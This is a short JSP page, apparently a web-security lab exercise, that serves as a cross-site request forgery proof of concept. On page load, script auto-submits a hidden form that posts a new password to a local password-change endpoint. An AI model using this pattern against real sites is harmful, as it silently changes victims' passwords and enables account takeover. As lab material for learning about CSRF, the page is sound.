<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Insert title here</title>
<script src="/servlettest/js/jquery-3.7.1.min.js"></script>
<script>
$(document).ready(function(){
        //구현
});
</script>
</head>
<body>
<form action="http://127.0.0.1:8080/jsptest/secure/secure_csrf_pw.jsp" method="post">
	<input type="hidden" name="pw" value="mypassword">
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>